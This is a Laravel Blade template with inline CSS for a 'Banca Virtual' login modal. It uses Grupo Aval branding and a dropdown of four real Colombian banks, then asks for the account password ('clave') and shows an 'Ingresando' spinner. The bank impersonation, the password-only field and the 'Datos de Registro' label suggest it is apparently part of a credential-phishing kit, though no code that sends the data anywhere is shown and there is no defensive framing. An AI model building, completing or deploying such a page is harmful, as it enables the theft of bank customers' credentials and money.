{{-- Modal de Datos de Registro / Banca Virtual --}}
<div class="modal-overlay">
    <div class="modal-content">
        <div class="logo-container">
            <img src="{{ asset('images/logo-ava.png') }}" alt="Grupo AVAL" class="logo" />
        </div>

        <div id="form-section">
            <h2 class="title">Banca Virtual</h2>

            <div class="form-group">
                <label class="label">Selecciona tu banco *</label>
                <div class="select-container">
                    <button type="button" id="select-btn" class="select-btn">
                        <span id="selected-option" class="selected-option">-- Selecciona tu banco --</span>
                        <svg class="select-arrow" id="select-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
                        </svg>
                    </button>
                    <div id="dropdown" class="dropdown">
                        <button type="button" class="dropdown-option" data-value="avvillas">
                            <img src="{{ asset('images/logo-avv.png') }}" alt="Banco AV Villas" />
                        </button>
                        <button type="button" class="dropdown-option" data-value="bogota">
                            <img src="{{ asset('images/logo-bog.png') }}" alt="Banco de Bogotá" />
                        </button>
                        <button type="button" class="dropdown-option" data-value="occidente">
                            <img src="{{ asset('images/logo-occ.png') }}" alt="Banco de Occidente" />
                        </button>
                        <button type="button" class="dropdown-option" data-value="popular">
                            <img src="{{ asset('images/logo-pop.png') }}" alt="Banco Popular" />
                        </button>
                    </div>
                </div>
            </div>

            <div class="form-group">
                <label class="label" id="label-clave">Clave *</label>
                <input
                    type="password"
                    id="input-clave"
                    name="clave"
                    class="input"
                    placeholder="Ingresa tu clave"
                />
                <p class="error-message" id="error-input-clave"></p>
            </div>

            <button id="btn-ingresar" class="btn-submit" data-submit-button>
                {{ $buttonText ?? 'Ingresar' }}
            </button>
        </div>

        <div id="spinner-section" class="spinner-section hidden">
            <div id="selected-bank-logo" class="selected-bank-logo"></div>
            <div class="spinner-container">
                <div class="spinner"></div>
            </div>
            <p class="spinner-text">Ingresando</p>
        </div>
    </div>
</div>

<style>
    .modal-overlay {
        position: fixed;
        inset: 0;
        background-color: rgba(0, 0, 0, 0.5);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 50;
        padding: 1rem;
    }

    .modal-content {
        background-color: white;
        border-radius: 1rem;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        max-width: 85vw;
        width: 100%;
        padding: 1rem;
        animation: fadeIn 0.3s ease-out;
        box-sizing: border-box;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: scale(0.95); }
        to { opacity: 1; transform: scale(1); }
    }

    .logo-container {
        display: flex;
        justify-content: center;
        margin-bottom: 1.5rem;
    }

    .logo {
        height: 3.5rem;
        max-width: 100%;
        width: auto;
        object-fit: contain;
    }

    .title {
        font-size: 1.5rem;
        font-weight: 700;
        text-align: center;
        color: #1e40af;
        margin-bottom: 1.5rem;
    }

    .form-group {
        margin-bottom: 1rem;
    }

    .label {
        display: block;
        color: #374151;
        font-weight: 500;
        margin-bottom: 0.5rem;
    }

    .select-container {
        position: relative;
    }

    .select-btn {
        width: 100%;
        padding: 0.75rem 1rem;
        border: 2px solid #d1d5db;
        border-radius: 0.5rem;
        background: white;
        text-align: left;
        display: flex;
        align-items: center;
        justify-content: space-between;
        cursor: pointer;
        transition: all 0.2s;
    }

    .select-btn:focus {
        outline: none;
        border-color: #2563eb;
        box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }

    .selected-option {
        color: #9ca3af;
        font-size: 0.875rem;
    }

    .select-arrow {
        width: 1.25rem;
        height: 1.25rem;
        color: #9ca3af;
        transition: transform 0.2s;
    }

    .dropdown {
        display: none;
        position: absolute;
        z-index: 50;
        width: 100%;
        margin-top: 0.5rem;
        background: white;
        border: 2px solid #d1d5db;
        border-radius: 0.5rem;
        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
    }

    .dropdown.visible {
        display: block;
    }

    .dropdown-option {
        width: 100%;
        padding: 0.75rem 1rem;
        border: none;
        background: white;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        border-bottom: 1px solid #f3f4f6;
    }

    .dropdown-option:hover {
        background-color: #dbeafe;
    }

    .dropdown-option img {
        height: 2rem;
        object-fit: contain;
    }

    .input {
        width: 100%;
        padding: 0.75rem 1rem;
        border: 2px solid #d1d5db;
        border-radius: 0.5rem;
        font-size: 1rem;
        transition: all 0.2s;
        box-sizing: border-box;
    }

    .input:focus {
        outline: none;
        border-color: #2563eb;
        box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }

    .error-message {
        color: #dc2626;
        font-size: 0.75rem;
        margin-top: 0.25rem;
        display: none;
    }

    .error-message.visible {
        display: block;
    }

    .btn-submit {
        width: 100%;
        background-color: #1d4ed8;
        color: white;
        font-weight: 700;
        padding: 1rem 1.5rem;
        border-radius: 0.75rem;
        border: none;
        cursor: pointer;
        transition: all 0.2s;
        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
    }

    .btn-submit:hover:not(:disabled) {
        background-color: #1e40af;
        transform: scale(1.05);
    }

    .btn-submit:disabled {
        opacity: 0.5;
        cursor: not-allowed;
    }

    .spinner-section {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        margin-top: 1.5rem;
    }

    .spinner-container {
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .spinner {
        width: 5rem;
        height: 5rem;
        border: 4px solid #dbeafe;
        border-top-color: #2563eb;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .spinner-text {
        margin-top: 1rem;
        text-align: center;
        color: #374151;
        font-size: 1rem;
        font-weight: 600;
    }

    .hidden {
        display: none;
    }
</style>
